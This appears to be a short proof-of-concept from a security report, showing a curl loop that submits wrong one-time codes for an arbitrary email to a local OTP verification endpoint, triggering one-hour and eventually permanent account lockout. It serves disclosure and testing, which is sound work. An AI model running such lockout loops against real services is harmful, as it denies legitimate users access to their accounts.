# PoC — arbitrary-email OTP lockout

PoC-Status: theoretical

Against an isolated local deployment with a disposable victim account:

```bash
for i in 1 2 3 4 5; do
  curl -sS -X POST http://127.0.0.1:5173/api/auth/verify-otp \
    -H 'content-type: application/json' \
    --data '{"email":"victim@example.invalid","code":"00000000"}'
done
```

Expected state transition from `verifyOtp`: the account's persistent `failedAttempts` reaches five and `lockedUntil` is set for one hour. Repeating after lock expiry eventually reaches the permanent-lock branch at twenty attempts.

Do not run this against a real account.
